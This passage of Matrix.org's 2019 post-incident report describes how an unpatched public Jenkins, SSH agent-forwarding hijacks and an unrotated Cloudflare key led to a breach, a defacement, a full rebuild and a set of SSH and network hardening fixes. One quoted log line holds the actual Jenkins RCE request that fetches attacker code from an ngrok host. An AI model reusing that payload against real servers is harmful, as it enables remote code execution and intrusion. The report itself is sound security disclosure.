&lt;p&gt;The deployment which was compromised in this incident was mainly set up back in Aug 2017 when we vacated our previous datacenter at short notice, thanks to our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2017&#x2F;07&#x2F;07&#x2F;a-call-to-arms-supporting-matrix&#x2F;&quot;&gt;funding situation&lt;&#x2F;a&gt; at the time. Previously we had been piggybacking on the well-managed production datacenters of our previous employer, but during the exodus we needed to move as rapidly as possible, and so we span up a bunch of vanilla Debian boxes on &lt;a href=&quot;https:&#x2F;&#x2F;upcloud.com&quot;&gt;UpCloud&lt;&#x2F;a&gt;, and shifted over services as simply as we could.  We had no dedicated ops people on the project at that point, so this was a subset of the Synapse and Riot&#x2F;Web dev teams putting on ops hats to rapidly get set up, whilst also juggling the daily fun of keeping the ever-growing Matrix.org server running and trying to actually develop and improve Matrix itself.&lt;&#x2F;p&gt;
&lt;p&gt;In practice, this meant that some corners were cut that we expected to be able to come back to and address once we had dedicated ops staff on the team.  For instance, we skipped setting up a VPN for accessing production in favour of simply SSHing into the servers over the internet.  We also went for the simplest possible config management system: checking all the configs for the services into a private git repo.  We also didn’t spend much time hardening the default Debian installations - for instance, the default image allows root access via SSH and allows SSH agent forwarding, and the config wasn’t tweaked.  This is particularly unfortunate, given our previous production OS (a customised Debian variant) had got all these things right - but the attitude was that because we’d got this right in the past, we’d be easily able to get it right in future once we fixed up the hosts with proper configuration management etc.&lt;&#x2F;p&gt;
&lt;p&gt;Separately, we also made the controversial decision to maintain a public-facing Jenkins instance.  We did this deliberately, despite the risks associated with running a complicated publicly available service like Jenkins, but reasoned that as a FOSS project, it is imperative that we are transparent and that continuous integration results and artefacts are available and directly visible to all contributors - whether they are part of the core dev team or not.  So we put Jenkins on its own host, gave it some macOS build slaves, and resolved to keep an eye open for any security alerts which would require an upgrade.&lt;&#x2F;p&gt;
&lt;p&gt;Lots of stuff then happened over the following months - we &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;01&#x2F;29&#x2F;status-partners-up-with-new-vector-fueling-decentralised-comms-and-the-matrix-ecosystem&#x2F;&quot;&gt;secured funding&lt;&#x2F;a&gt; in Jan 2018; the French Government began talking about &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;04&#x2F;26&#x2F;matrix-and-riot-confirmed-as-the-basis-for-frances-secure-instant-messenger-app&#x2F;&quot;&gt;switching to Matrix&lt;&#x2F;a&gt; around the same time; the pressure of getting Matrix (and Synapse and Riot) out of beta and to a stable 1.0 grew ever stronger; the challenge of handling the ever-increasing traffic on the Matrix.org server soaked up more and more time, and we started to see our first major security incidents (a major DDoS in March 2018, mitigated by shielding behind Cloudflare, and various attacks on the more beta bits of Matrix itself).&lt;&#x2F;p&gt;
&lt;p&gt;Good news was that funding meant that in March 2018 we were able to hire a fulltime ops specialist!  By this point, however, we had two new critical projects in play to try to ensure long-term funding for the project via New Vector, the startup formed in 2017 to hire the core team. Firstly, to build out &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular.im&lt;&#x2F;a&gt; as a commercial-grade Matrix SaaS provider, and secondly, to support France in rolling out their massive Matrix deployment as a flagship example how Matrix can be used.  And so, for better or worse, the brand new ops team was given a very clear mandate: to largely ignore the legacy datacenter infrastructure, and instead focus exclusively on building entirely new, pro-grade infrastructure for Modular.im and France, with the expectation of eventually migrating Matrix.org itself into Modular when ready (or just turning off the Matrix.org server entirely, once we have account portability).&lt;&#x2F;p&gt;
&lt;p&gt;So we ended up with two production environments; the legacy Matrix.org infra, whose shortcomings continued to linger and fester off the radar, and separately all the new Modular.im hosts, which are almost entirely operationally isolated from the legacy datacenter; whose configuration is managed exclusively by Ansible, and have sensible SSH configs which disallow root login etc.  With 20:20 hindsight, the failure to prioritise hardening the legacy infrastructure is quite a good example of the &lt;a href=&quot;https:&#x2F;&#x2F;fastjetperformance.com&#x2F;podcasts&#x2F;how-i-almost-destroyed-a-50-million-war-plane-when-display-flying-goes-wrong-and-the-normalisation-of-deviance&#x2F;&quot;&gt;normalisation of deviance&lt;&#x2F;a&gt; - we had gotten too used to the bad practices; all our attention was going elsewhere; and so we simply failed to prioritise getting back to fix them.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;the-incident&quot;&gt;The Incident&lt;&#x2F;h3&gt;
&lt;p&gt;The first evidence of things going wrong was a tweet from &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;JaikeySarraf&quot;&gt;JaikeySarraf&lt;&#x2F;a&gt;, a security researcher who kindly reached out via DM at the end of Apr 9th to warn us that our Jenkins was outdated after stumbling across it via Google.  In practice, our Jenkins was running version 2.117 with plugins which had been updated on an adhoc basis, and we had indeed missed the security advisory (partially because most of our CI pipelines had moved to TravisCI, CircleCI and Buildkite), and so on Apr 10th we updated the Jenkins and investigated to see if any vulnerabilities had been exploited.&lt;&#x2F;p&gt;
&lt;p&gt;In this process, we spotted an unrecognised SSH key in &lt;code&gt;&#x2F;root&#x2F;.ssh&#x2F;authorized_keys2&lt;&#x2F;code&gt; on the Jenkins build server.  This was suspicious both due to the key not being in our key DB and the fact the key was stored in the obscure &lt;code&gt;authorized_keys2&lt;&#x2F;code&gt; file (a legacy location from back when OpenSSH transitioned from &lt;a href=&quot;https:&#x2F;&#x2F;searchsecurity.techtarget.com&#x2F;tip&#x2F;An-introduction-to-SSH2&quot;&gt;SSH1-&amp;gt;SSH2&lt;&#x2F;a&gt;).  Further inspection showed that 19 hosts in total had the same key present in the same place.&lt;&#x2F;p&gt;
&lt;p&gt;At this point we started doing forensics to understand the scope of the attack and plan the response, as well as taking snapshots of the hosts to protect data in case the attacker realised we were aware and attempted to vandalise or cover their tracks.  Findings were:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The attacker had first compromised Jenkins on March 13th via an RCE vulnerability (CVE-2019-1003000 - &lt;a href=&quot;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;46572&quot;&gt;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;46572&lt;&#x2F;a&gt;):&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;code&gt;matrix.org:443 151.34.xxx.xxx - - [13&#x2F;Mar&#x2F;2019:18:46:07 +0000] &amp;quot;GET &#x2F;jenkins&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition&#x2F;checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0A@GrabResolver(name=%27orange.tw%27,%20root=%27http:&#x2F;&#x2F;5f36xxxx.ngrok.io&#x2F;jenkins&#x2F;%27)%0A@Grab(group=%27tw.orange%27,%20module=%270x3a%27,%20version=%27000%27)%0Aimport%20Orange; HTTP&#x2F;1.1&amp;quot; 500 6083 &amp;quot;-&amp;quot; &amp;quot;Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0&amp;quot;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;This allowed them to further compromise a Jenkins slave (Flywheel, an old Mac Pro used mainly for continuous integration testing of Riot&#x2F;iOS and Riot&#x2F;Android). The attacker put an SSH key on the box, which was unfortunately exposed to the internet via a high-numbered SSH port for ease of admin by remote users, and placed a trap which waited for any user to SSH into the jenkins user, which would then hijack any available forwarded SSH keys to try to add the attacker’s SSH key to root@ on as many other hosts as possible.&lt;&#x2F;li&gt;
&lt;li&gt;On Apr 4th at 12:32 GMT, one of the Riot devops team members SSH’d into the Jenkins slave to perform some admin, forwarding their SSH key for convenience for accessing other boxes while doing so.  This triggered the trap, and resulted in the majority of the malicious keys being inserted to the remote hosts.&lt;&#x2F;li&gt;
&lt;li&gt;From this point on, the attacker proceeded to explore the network, performing targeted exfiltration of data (e.g. our passbolt database, which is thankfully end-to-end encrypted via GPG) seemingly targeting credentials and data for use in onward exploits, and installing backdoors for later use (e.g. a setuid root shell at &lt;code&gt;&#x2F;usr&#x2F;share&#x2F;bsd-mail&#x2F;shroot&lt;&#x2F;code&gt;).&lt;&#x2F;li&gt;
&lt;li&gt;The majority of access to the hosts occurred between Apr 4th and 6th.&lt;&#x2F;li&gt;
&lt;li&gt;There was no evidence of large-scale data exfiltration, based on analysing network logs.&lt;&#x2F;li&gt;
&lt;li&gt;There was no evidence of Modular.im hosts having been compromised.  (Modular’s provisioning system and DB did run on the old infrastructure, but it was not used to tamper with the modular instances themselves).&lt;&#x2F;li&gt;
&lt;li&gt;There was no evidence of the identity server databases having been compromised.&lt;&#x2F;li&gt;
&lt;li&gt;There was no evidence of tampering in our source code repositories.&lt;&#x2F;li&gt;
&lt;li&gt;There was no evidence of tampering of our distributed software packages.&lt;&#x2F;li&gt;
&lt;li&gt;Two more hosts were compromised on Apr 5th by similarly hijacking another developer SSH agent as the dev logged into a production server.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;By around 2am on Apr 11th we felt that we had sufficient visibility on the attacker’s behaviour to be able to do a first pass at evicting them by locking down SSH, removing their keys, and blocking as much network traffic as we could.&lt;&#x2F;p&gt;
&lt;p&gt;We then started a full rebuild of the datacenter on the morning of Apr 11th, given that the only responsible course of action when an attacker has acquired root is to salt the earth and start over afresh. This meant rotating all secrets; isolating the old hosts entirely (including ones which appeared to not have been compromised, for safety), spinning up entirely new hosts, and redeploying everything from scratch with the fresh secrets.  The process was significantly slowed down by colliding with unplanned maintenance and provisioning issues in the datacenter provider and unexpected delays spent waiting to copy data volumes between datacenters, but by 1am on Apr 12th the core matrix.org server was back up, and we had enough of a website up to publish the initial &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;04&#x2F;11&#x2F;security-incident&#x2F;&quot;&gt;security incident blog post&lt;&#x2F;a&gt;. (This was actually static HTML, faked by editing the generated WordPress content from the old website. We opted not to transition any WordPress deployments to the new infra, in a bid to keep our attack surface as small as possible going forwards).&lt;&#x2F;p&gt;
&lt;p&gt;Given the production database had been accessed, we had no choice but drop all access_tokens for matrix.org, to stop the attacker accessing user accounts, causing a forced logout for all users on the server.  We also recommended all users change their passwords, given the salted &amp;amp; hashed (4096 rounds of bcrypt) passwords had likely been exfiltrated.&lt;&#x2F;p&gt;
&lt;p&gt;At about 4am we had enough of the bare necessities back up and running to pause for sleep.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;the-defacement&quot;&gt;The Defacement&lt;&#x2F;h3&gt;
&lt;p&gt;At around 7am, we were woken up to the news that the attacker had managed to replace the matrix.org website with a defacement (as per &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;9435&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;9435&lt;&#x2F;a&gt;). It looks like the attacker didn’t think we were being transparent enough in our initial blog post, and wanted to make it very clear that they had access to many hosts, including the production database and had indeed exfiltrated password hashes.  Unfortunately it took a few hours for the defacement to get on our radar as our monitoring infrastructure hadn’t yet been fully restored and the normal paging infrastructure wasn’t back up (we now have emergency-emergency-paging for this eventuality).&lt;&#x2F;p&gt;
&lt;p&gt;On inspection, it transpired that the attacker had not compromised the new infrastructure, but had used Cloudflare to repoint the DNS for matrix.org to a defacement site hosted on Github.  Now, as part of rotating the secrets which had been compromised via our configuration repositories, we had of course rotated the Cloudflare API key (used to automate changes to our DNS) during the rebuild on Apr 11.  When you log into Cloudflare, it looks something like this...&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;cf.png&quot; alt=&quot;Cloudflare login UI&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;...where the top account is your personal one, and the bottom one is an admin role account.  To rotate the admin API key, we clicked on the admin account to log in as the admin, and then went to the Profile menu, found the API keys and hit the &lt;a href=&quot;https:&#x2F;&#x2F;support.cloudflare.com&#x2F;hc&#x2F;en-us&#x2F;articles&#x2F;221318707-How-do-I-change-my-Global-API-Key-&quot;&gt;Change API Key&lt;&#x2F;a&gt; button.&lt;&#x2F;p&gt;
&lt;p&gt;Unfortunately, when you do this, it turns out that the API Key it changes is your personal one, rather than the admin one.  As a result, in our rush we thought we’d rotated the admin API key, but we hadn’t, thus accidentally enabling the defacement.&lt;&#x2F;p&gt;
&lt;p&gt;To flush out the defacement we logged in directly as the admin user and changed the API key, pointed the DNS back at the right place, and continued on with the rebuild.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;the-rebuild&quot;&gt;The Rebuild&lt;&#x2F;h3&gt;
&lt;p&gt;The goal of the rebuild has been to get all the higher priority services back up rapidly - whilst also ensuring that good security practices are in place going forwards.  In practice, this meant making some immediate decisions about how to ensure the new infrastructure did not suffer the same issues and fate as the old.  Firstly, we ensured the most obvious mistakes that made the breach possible were mitigated:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Access via SSH restricted as heavily as possible&lt;&#x2F;li&gt;
&lt;li&gt;SSH agent forwarding disabled server-side&lt;&#x2F;li&gt;
&lt;li&gt;All configuration to be managed by Ansible, with secrets encrypted in vaults, rather than sitting in a git repo.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Then, whilst reinstating services on the new infra, we opted to review &lt;strong&gt;everything&lt;&#x2F;strong&gt; being installed for security risks, replacing with securer alternatives if needed, even if it slowed down the rebuild.  Particularly, this meant:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Jenkins has been replaced by &lt;a href=&quot;https:&#x2F;&#x2F;buildkite.com&#x2F;matrix-dot-org&quot;&gt;Buildkite&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Wordpress has been replaced by static generated sites (e.g. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;tree&#x2F;master&#x2F;gatsby&quot;&gt;Gatsby&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;cgit has been replaced by &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&quot;&gt;gitlab&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Entirely new packaging building, signing &amp;amp; distribution infrastructure (more on that later)&lt;&#x2F;li&gt;
&lt;li&gt;etc.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Now, while we restored the main synapse (homeserver), sydent (identity server), sygnal (push server), databases, load balancers, intranet and website on Apr 11, it’s important to understand that there were over 100 other services running on the infra - which is why it is taking a while to get full parity with where we were before.&lt;&#x2F;p&gt;
&lt;p&gt;In the interest of transparency (and to try to give a sense of scale of the impact of the breach), here is the public-facing service list we restored, showing priority (1 is top, 4 is bottom) and the % restore status as of May 4th:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;services.png&quot; alt=&quot;Service status&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Apologies again that it took longer to get some of these services back up than we’d preferred (and that there are still a few pending).  Once we got the top priority ones up, we had no choice but to juggle the remainder alongside remediation work, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;03&#x2F;security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28-a&#x2F;&quot;&gt;other security work&lt;&#x2F;a&gt;, and actually working on Matrix(!), whilst ensuring that the services we restored were being restored securely.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;remediations&quot;&gt;Remediations&lt;&#x2F;h3&gt;
&lt;p&gt;Once the majority of the P1 and P2 services had been restored, on Apr 24 we held a formal retrospective for the team on the whole incident, which in turn kicked off a full security audit over the entirety of our infrastructure and operational processes.&lt;&#x2F;p&gt;
&lt;p&gt;We’d like to share the resulting remediation plan in as much detail as possible, in order to show the approach we are taking, and in case it helps others avoid repeating the mistakes of our past. Inevitably we’re going to have to skip over some of the items, however - after all, remediations imply that there’s something that could be improved, and for obvious reasons we don’t want to dig into areas where remediation work is still ongoing.  We will aim to provide an update on these once ongoing work is complete, however.&lt;&#x2F;p&gt;
&lt;p&gt;We should also acknowledge that after being removed from the infra, the attacker chose to file a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;issues&#x2F;371&quot;&gt;set of Github issues&lt;&#x2F;a&gt; on Apr 12 to highlight some of the security issues that had taken advantage of during the breach.  Their actions matched the findings from our forensics on Apr 10, and their suggested remediations aligned with our plan.&lt;&#x2F;p&gt;
&lt;p&gt;We’ve split the remediation work into the following domains.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;ssh&quot;&gt;SSH&lt;&#x2F;h4&gt;
&lt;p&gt;Some of the biggest issues exposed by the security breach concerned our use of SSH, which we’ll take in turn:&lt;&#x2F;p&gt;
&lt;h5 id=&quot;ssh-agent-forwarding-should-be-disabled&quot;&gt;SSH agent forwarding should be disabled.&lt;&#x2F;h5&gt;
&lt;p&gt;SSH agent forwarding is a beguilingly convenient mechanism which allows a user to ‘forward’ access to their private SSH keys to a remote server whilst logged in, so they can in turn access other servers via SSH from that server.  Typical uses are to make it easy to copy files between remote servers via scp or rsync, or to interact with a SCM system such as Github via SSH from a remote server.  Your private SSH keys end up available for use by the server for as long as you are logged into it, letting the server impersonate you.&lt;&#x2F;p&gt;
&lt;p&gt;The common wisdom on this tends to be something like: “Only use agent forwarding when connecting to trusted hosts”.  For instance, &lt;a href=&quot;https:&#x2F;&#x2F;developer.github.com&#x2F;v3&#x2F;guides&#x2F;using-ssh-agent-forwarding&#x2F;#setting-up-ssh-agent-forwarding&quot;&gt;Github’s guide to using SSH agent forwarding&lt;&#x2F;a&gt; says: &lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Warning&lt;&#x2F;strong&gt;: You may be tempted to use a wildcard like &lt;code&gt;Host *&lt;&#x2F;code&gt; to just apply this setting (ForwardAgent: yes) to all SSH connections. That&#x27;s not really a good idea, as you&#x27;d be sharing your local SSH keys with &lt;em&gt;every&lt;&#x2F;em&gt; server you SSH into. They won&#x27;t have direct access to the keys, but they will be able to use them &lt;em&gt;as you&lt;&#x2F;em&gt; while the connection is established. &lt;strong&gt;You should only add servers you trust and that you intend to use with agent forwarding&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;As a result, several of the team doing ops work had set &lt;code&gt;Host *.matrix.org ForwardAgent: yes&lt;&#x2F;code&gt; in their ssh client configs, thinking “well, what &lt;em&gt;can&lt;&#x2F;em&gt; we trust if not our own servers?”&lt;&#x2F;p&gt;
&lt;p&gt;This was a massive, massive mistake.&lt;&#x2F;p&gt;
&lt;p&gt;If there is one lesson everyone should learn from this whole mess, it is: &lt;strong&gt;SSH agent forwarding is incredibly unsafe, and in general you should never use it.&lt;&#x2F;strong&gt;  Not only can malicious code running on the server as that user (or root) hijack your credentials, but your credentials can in turn be used to access hosts behind your network perimeter which might otherwise be inaccessible.  All it takes is someone to have snuck malicious code on your server waiting for you to log in with a forwarded agent, and &lt;em&gt;boom&lt;&#x2F;em&gt;, even if it was just a one-off &lt;code&gt;ssh -A&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Our remediations for this are:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Disable all ssh agent forwarding on the servers.&lt;&#x2F;li&gt;
&lt;li&gt;If you need to jump through a box to ssh into another box, use &lt;code&gt;ssh -J $host&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;This can also be used with rsync via &lt;code&gt;rsync -e &amp;quot;ssh -J $host&amp;quot;&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;If you need to copy files between machines, use rsync rather than scp (OpenSSH 8.0’s &lt;a href=&quot;https:&#x2F;&#x2F;www.openssh.com&#x2F;txt&#x2F;release-8.0&quot;&gt;release notes&lt;&#x2F;a&gt; explicitly recommends using more modern protocols than scp).&lt;&#x2F;li&gt;
&lt;li&gt;If you need to regularly copy stuff from server to another (or use SSH to GitHub to check out something from a private repo), it might be better to have a specific SSH ‘deploy key’ created for this, stored server-side and only able to perform limited actions.&lt;&#x2F;li&gt;
&lt;li&gt;If you just need to check out stuff from public git repos, use https rather than git+ssh.&lt;&#x2F;li&gt;
&lt;li&gt;Try to educate everyone on the perils of SSH agent forwarding: if our past selves can’t be a good example, they can at least be a horrible warning...&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Another approach could be to allow forwarding, but configure your SSH agent to prompt whenever a remote app tries to access your keys.  However, not all agents support this (OpenSSH’s does via &lt;code&gt;ssh-add -c&lt;&#x2F;code&gt;, but gnome-keyring for instance doesn’t), and also it might still be possible for a hijacker to race with the valid request to hijack your credentials.&lt;&#x2F;p&gt;
&lt;h5 id=&quot;ssh-should-not-be-exposed-to-the-general-internet&quot;&gt;SSH should not be exposed to the general internet&lt;&#x2F;h5&gt;
&lt;p&gt;Needless to say, SSH is no longer exposed to the general internet.  We are rolling out a VPN as the main access to dev network, and then SSH bastion hosts to be the only access point into production, using SSH keys to restrict access to be as minimal as possible.&lt;&#x2F;p&gt;
&lt;h5 id=&quot;ssh-keys-should-give-minimal-access&quot;&gt;SSH keys should give minimal access&lt;&#x2F;h5&gt;
&lt;p&gt;Another major problem factor was that individual SSH keys gave very broad access. We have gone through ensuring that SSH keys grant the least privilege required to the users in question. Particularly, root login should not be available over SSH.&lt;&#x2F;p&gt;
&lt;p&gt;A typical scenario where users might end up with unnecessary access to production are developers who simply want to push new code or check its logs.  We are mitigating this by switching over to using continuous deployment infrastructure everywhere rather than developers having to actually SSH into production.  For instance, the new &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&quot;&gt;matrix.org blog&lt;&#x2F;a&gt; is continuously deployed into production by Buildkite from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&quot;&gt;GitHub&lt;&#x2F;a&gt; without anyone needing to SSH anywhere.  Similarly, logs should be available to developers from a logserver in real time, without having to SSH into the actual production host. We’ve already been experimenting internally with sentry for this.&lt;&#x2F;p&gt;
&lt;p&gt;Relatedly, we’ve also shifted to requiring multiple SSH keys per user (per device, and for privileged &#x2F; unprivileged access), to have finer grained granularity over locking down their permissions and revoking them etc.  (We had actually already started this process, and while it didn’t help prevent the attack, it did assist with forensics).&lt;&#x2F;p&gt;
&lt;h5 id=&quot;two-factor-authentication&quot;&gt;Two factor authentication&lt;&#x2F;h5&gt;
&lt;p&gt;We are rolling out two-factor authentication for SSH to ensure that even if keys are compromised (e.g. via forwarding hijack), the attacker needs to have also compromised other physical tokens in order to successfully authenticate.&lt;&#x2F;p&gt;
&lt;h5 id=&quot;it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys&quot;&gt;It should be made as hard as possible to add malicious SSH keys&lt;&#x2F;h5&gt;
&lt;p&gt;We’ve decided to stop users from being able to directly manage their own SSH keys in production via &lt;code&gt;~&#x2F;.ssh&#x2F;authorized_keys&lt;&#x2F;code&gt; (or &lt;code&gt;~&#x2F;.ssh&#x2F;authorized_keys2&lt;&#x2F;code&gt; for that matter) - we can see no benefit from letting non-root users set keys.&lt;&#x2F;p&gt;
&lt;p&gt;Instead, keys for all accounts are managed exclusively by Ansible via &lt;code&gt;&#x2F;etc&#x2F;ssh&#x2F;authorized_keys&#x2F;$account&lt;&#x2F;code&gt; (using sshd’s &lt;code&gt;AuthorizedKeysFile &#x2F;etc&#x2F;ssh&#x2F;authorized_keys&#x2F;%u&lt;&#x2F;code&gt; directive).&lt;&#x2F;p&gt;
&lt;h5 id=&quot;changes-to-ssh-keys-should-be-carefully-monitored&quot;&gt;Changes to SSH keys should be carefully monitored&lt;&#x2F;h5&gt;
&lt;p&gt;If we’d had sufficient monitoring of the SSH configuration, the breach could have been caught instantly.  We are doing this by managing the keys exclusively via Ansible, and also improving our intrusion detection in general.&lt;&#x2F;p&gt;
&lt;p&gt;Similarly, we are working on tracking changes and additions to other credentials (and enforcing their complexity).&lt;&#x2F;p&gt;
&lt;h5 id=&quot;ssh-config-should-be-hardened-disabling-unnecessary-options&quot;&gt;SSH config should be hardened, disabling unnecessary options&lt;&#x2F;h5&gt;
&lt;p&gt;If we’d gone through reviewing the default sshd config when we set up the datacenter in the first place, we’d have caught several of these failure modes at the outset.  We’ve now done so (as per above).&lt;&#x2F;p&gt;
&lt;p&gt;We’d like to recommend that packages of openssh start having secure-by-default configurations, as a number of the old options just don’t need to exist on most newly provisioned machines. &lt;&#x2F;p&gt;
&lt;h4 id=&quot;network-architecture&quot;&gt;Network architecture&lt;&#x2F;h4&gt;
&lt;p&gt;As mentioned in the History section, the legacy network infrastructure effectively grew organically, without really having a core network or a good split between different production environments.&lt;&#x2F;p&gt;
&lt;p&gt;We are addressing this by:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Splitting our infrastructure into strictly separated service domains, which are firewalled from each other and can only access each other via their respective ‘front doors’ (e.g. HTTPS APIs exposed at the loadbalancers).
&lt;ul&gt;
&lt;li&gt;Development&lt;&#x2F;li&gt;
&lt;li&gt;Intranet&lt;&#x2F;li&gt;
&lt;li&gt;Package Build (airgapped; see below for more details)&lt;&#x2F;li&gt;
&lt;li&gt;Package Distribution&lt;&#x2F;li&gt;
&lt;li&gt;Production, which is in turn split per class of service.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Access to these networks will be via VPN + SSH jumpboxes (as per above).  Access to the VPN is via per-device certificate + 2FA, and SSH via keys as per above.&lt;&#x2F;li&gt;
&lt;li&gt;Switching to an improved internal VPN between hosts within a given network environment (i.e. we don’t trust the datacenter LAN).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We’re also running most services in containers by default going forwards (previously it was a bit of a mix of running unix processes, VMs, and occasional containers), providing an additional level of namespace isolation. &lt;&#x2F;p&gt;
&lt;h4 id=&quot;keeping-patched&quot;&gt;Keeping patched&lt;&#x2F;h4&gt;
&lt;p&gt;Needless to say, this particular breach would not have happened had we kept the public-facing Jenkins patched (although there would of course still have been scope for a 0-day attack).&lt;&#x2F;p&gt;
&lt;p&gt;Going forwards, we are establishing a formal regular process for deploying security updates rather than relying on spotting security advisories on an ad hoc basis. We are now also setting up regular vulnerability scans against production so we catch any gaps before attackers do.&lt;&#x2F;p&gt;
&lt;p&gt;Aside from our infrastructure, we’re also extending the process of regularly checking for security updates to also checking for outdated dependencies in our distributed software (Riot, Synapse, etc) too, given the discipline to regularly chase outdated software applies equally to both.&lt;&#x2F;p&gt;
&lt;p&gt;Moving all our machine deployment and configuration into Ansible allows this to be a much simpler task than before.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;intrusion-detection&quot;&gt;Intrusion detection&lt;&#x2F;h4&gt;
&lt;p&gt;There’s obviously a lot we need to do in terms of spotting future attacks as rapidly as possible.  Amongst other strategies, we’re working on real-time log analysis for aberrant behaviour.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;incident-management&quot;&gt;Incident management&lt;&#x2F;h4&gt;
&lt;p&gt;There is much we have learnt from managing an incident at this scale. The main highlights taken from our internal retrospective are:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The need for a single incident manager to coordinate the technical response and coordinate prioritisation and handover between those handling the incident. (We lacked a single incident manager at first, given several of the team started off that week on holiday...)&lt;&#x2F;li&gt;
&lt;li&gt;The benefits of gathering all relevant info and checklists onto a canonical set of shared documents rather than being spread across different chatrooms and lost in scrollback.&lt;&#x2F;li&gt;
&lt;li&gt;The need to have an existing inventory of services and secrets available for tracking progress and prioritisation&lt;&#x2F;li&gt;
&lt;li&gt;The need to have a general incident management &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=19682451&amp;amp;p=2&quot;&gt;checklist&lt;&#x2F;a&gt; for future reference, which folks can familiarise themselves with ahead of time to avoid stuff getting forgotten.  The sort of stuff which will go on our checklist in future includes:
&lt;ul&gt;
&lt;li&gt;Remembering to appoint named incident manager, external comms manager &amp;amp; internal comms manager. (They could of course be the same person, but the roles are distinct).&lt;&#x2F;li&gt;
&lt;li&gt;Defining a sensible sequence of forensics, mitigations, communication, rotating secrets etc is followed rather than having to work it out on the fly and risk forgetting stuff&lt;&#x2F;li&gt;
&lt;li&gt;Remembering to informing the ICO (Information Commissioner Office) of any user data breaches&lt;&#x2F;li&gt;
&lt;li&gt;Guidelines on how to balance between forensics and rebuilding (i.e. how long to spend on forensics, if at all, before pulling the plug)&lt;&#x2F;li&gt;
&lt;li&gt;Reminders to snapshot systems for forensics &amp;amp; backups&lt;&#x2F;li&gt;
&lt;li&gt;Reminder to not redesign infrastructure during a rebuild.  There were a few instances where we lost time by seizing the opportunity to try to fix design flaws whilst rebuilding, some of which were avoidable.&lt;&#x2F;li&gt;
&lt;li&gt;Making sure that communication isn’t sent prematurely to users (e.g. we posted the blog post asking people to update their passwords before password reset had actually been restored - apologies for that.)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4 id=&quot;configuration-management&quot;&gt;Configuration management&lt;&#x2F;h4&gt;
